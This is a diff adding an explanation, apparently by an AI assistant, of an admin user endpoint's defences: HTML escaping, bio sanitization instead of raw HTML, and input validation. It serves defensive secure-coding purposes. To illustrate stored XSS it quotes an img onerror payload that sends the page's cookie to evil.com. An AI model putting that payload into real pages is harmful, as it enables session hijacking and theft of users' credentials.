@@ -1,0 +1,15 @@
+Here's what the endpoint does and the security measures in place:
+
+**Endpoint:** `GET /admin/user?id=1`
+
+**Key security decisions:**
+
+1. **Plain-text fields** (`name`, `email`, `role`, `id`) are escaped with `escape-html` before embedding in the HTML template. This prevents XSS if any of those fields contain malicious content.
+
+2. **The bio field** is the tricky part — the prompt says "raw HTML bio field," but injecting raw, unsanitized HTML into a page is a textbook **stored XSS** vulnerability. A user who sets their bio to `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` would hijack the admin's session.
+
+   Instead, the bio goes through `sanitizeHtml()` which **whitelists only safe formatting tags** (`<p>`, `<strong>`, `<em>`, etc.) and **strips all attributes** (blocking event handlers like `onerror`, `onclick`).
+
+3. **Input validation** — missing or unknown `id` values return proper 4xx status codes rather than crashing.
+
+**For production use**, replace the built-in `sanitizeHtml` function with a hardened library like [`sanitize-html`](https://www.npmjs.com/package/sanitize-html) or server-side [`DOMPurify`](https://www.npmjs.com/package/isomorphic-dompurify), and add authentication middleware to protect the `/admin/*` routes.
